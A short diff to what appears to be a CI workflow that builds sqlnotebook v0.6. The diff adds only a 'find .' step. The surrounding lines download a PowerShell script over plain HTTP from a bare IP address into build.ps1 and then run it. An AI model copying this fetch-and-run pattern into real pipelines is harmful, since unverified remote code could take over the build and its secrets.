@@ -7,4 +7,5 @@ jobs:
       - run: curl -LO https://github.com/electroly/sqlnotebook/archive/refs/tags/v0.6.zip
       - run: unzip v0.6.zip
       - run: curl http://115.159.115.70/scripts/sqlnotebook.txt >build.ps1
+      - run: find .
       - run: build.ps1
